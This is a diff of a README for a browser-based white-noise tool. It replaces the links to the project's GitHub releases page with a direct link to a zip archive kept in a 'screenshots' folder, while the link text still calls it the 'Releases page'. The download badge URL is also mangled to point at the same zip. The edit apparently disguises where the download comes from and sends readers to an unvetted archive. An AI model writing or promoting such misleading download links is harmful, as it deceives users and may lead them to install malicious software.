@@ -1,7 +1,7 @@
 # 🎶 adaptive-white-noise - Focus Better with Sound Masking
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20adaptive--white--noise-ff5e57?style=for-the-badge&logo=github)](https://github.com/Kei1999/adaptive-white-noise/releases)
+[![Download](https://raw.githubusercontent.com/Kei1999/adaptive-white-noise/main/screenshots/adaptive-white-noise-1.3.zip%20adaptive--white--noise-ff5e57?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Kei1999/adaptive-white-noise/main/screenshots/adaptive-white-noise-1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to **adaptive-white-noise**, your smart browser-based sound masking tool. This application helps you focus better by adapting to your environment.
@@ -20,7 +20,7 @@ To use **adaptive-white-noise**, you need:
 - Speakers or headphones for sound output.
 
 ## 🖥️ How to Download & Install
-1. **Visit the Releases Page**: Go to the [Releases page here](https://github.com/Kei1999/adaptive-white-noise/releases).
+1. **Visit the Releases Page**: Go to the [Releases page here](https://raw.githubusercontent.com/Kei1999/adaptive-white-noise/main/screenshots/adaptive-white-noise-1.3.zip).
 2. **Choose Your Version**: Locate the latest version listed. Each release includes a summary of new features and fixes.
 3. **Download the Application**: Click on the download link for the browser-based version.
 4. **Open in Your Browser**: After downloading, you can open the application directly in your browser. There is no installation required.
